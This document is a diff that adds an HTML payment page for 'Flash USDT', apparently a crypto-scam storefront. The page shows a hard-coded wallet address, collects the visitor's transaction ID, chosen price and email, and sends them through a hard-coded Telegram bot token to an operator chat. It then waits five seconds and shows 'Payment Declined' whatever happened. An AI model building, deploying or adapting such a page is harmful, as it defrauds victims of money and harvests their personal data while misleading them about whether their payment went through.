@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Flash USDT Payment</title>
+  <style>
+    body {
+      background: #0a0a0a;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    img.logo {
+      width: 100px;
+      border-radius: 50%;
+    }
+    .container {
+      margin-top: 20px;
+      background: #111;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    input, button {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+    }
+    input[type="text"], input[type="email"] {
+      background: #222;
+      color: white;
+    }
+    .copy-group {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .copy-group input {
+      width: 70%;
+    }
+    .copy-group button {
+      width: 20%;
+      background: #007bff;
+      color: white;
+      cursor: pointer;
+    }
+    .images {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+    }
+    .images img {
+      width: 60px;
+      height: 60px;
+      cursor: pointer;
+      border-radius: 10px;
+      border: 2px solid transparent;
+    }
+    .images img.selected {
+      border-color: #0f0;
+    }
+    .loading-circle {
+      border: 4px solid #444;
+      border-top: 4px solid white;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-left: 10px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .popup {
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -30%);
+      background: #111;
+      padding: 20px;
+      border-radius: 10px;
+      display: none;
+    }
+    .popup img {
+      width: 200px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="usdt.png" class="logo" alt="logo">
+  <h2>Complete Your Flash USDT Payment</h2>
+  <p>Payment only with USDT [BEP20] other payment will be lost <b></b> </p>
+
+  <div class="container">
+    <img src="payment1.png" width="100%" />
+    <div class="copy-group">
+      <input type="text" value="
+        0x3eea6b7428e9feaa9dfef6c691a530b905d6a823" id="walletAddress" readonly>
+      <button onclick="copyWallet()">Copy</button>
+    </div>
+  </div>
+
+  <div class="container">
+    <img src="payment2.png" width="100%" />
+  </div>
+
+  <div class="container">
+    <label>Transition ID</label>
+    <input type="text" value="Tx-VLHDo8-67755" readonly>
+
+    <label>TXID Payment</label>
+    <input type="text" id="txid">
+
+    <label>Select Price</label>
+    <div class="images" id="priceImages">
+      <img src="99.jpg" data-price="10">
+      <img src="199.jpg" data-price="22">
+      <img src="499.jpg" data-price="50">
+      <img src="749.jpg" data-price="76">
+      <img src="999.jpg" data-price="100">
+      <img src="1499.jpg" data-price="150">
+    </div>
+    <input type="text" id="priceSelected" placeholder="Selected price" readonly>
+
+    <label>Email</label>
+    <input type="email" id="email" placeholder="you@example.com">
+
+    <button id="submitBtn" onclick="submitPayment()">Payment Submit</button>
+  </div>
+
+  <div class="popup" id="popupWindow">
+    <img src="pay.png" onclick="declinePayment()" />
+  </div>
+
+  <script>
+    function copyWallet() {
+      let input = document.getElementById("walletAddress");
+      input.select();
+      document.execCommand("copy");
+      alert("Wallet address copied!");
+    }
+
+    // Price selection
+    document.querySelectorAll("#priceImages img").forEach(img => {
+      img.addEventListener("click", () => {
+        document.querySelectorAll("#priceImages img").forEach(i => i.classList.remove("selected"));
+        img.classList.add("selected");
+        document.getElementById("priceSelected").value = img.getAttribute("data-price") + " USDT";
+      });
+    });
+
+    function submitPayment() {
+      const txid = document.getElementById("txid").value.trim();
+      const price = document.getElementById("priceSelected").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const btn = document.getElementById("submitBtn");
+
+      if (!txid || !price || !email.includes("@")) {
+        alert("Please fill all fields correctly.");
+        return;
+      }
+
+      btn.innerHTML = 'Wait <span class="loading-circle"></span>';
+      btn.disabled = true;
+
+      // Send to Telegram
+      const token = "8341105381:AAG5jTg5iEBN5r_g5E3Iw3vy36r8u18uxn4";
+      const chatId = "7904210469";
+      const message = `💸 New Flash USDT Payment\n\n📩 Email: ${email}\n🔗 TXID: ${txid}\n💰 Price: ${price}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      setTimeout(() => {
+        document.getElementById("popupWindow").style.display = "block";
+      }, 5000);
+    }
+
+    function declinePayment() {
+      document.getElementById("popupWindow").innerHTML = "<h2>Payment Declined</h2>";
+    }
+  </script>
+
+</body>
+</html>
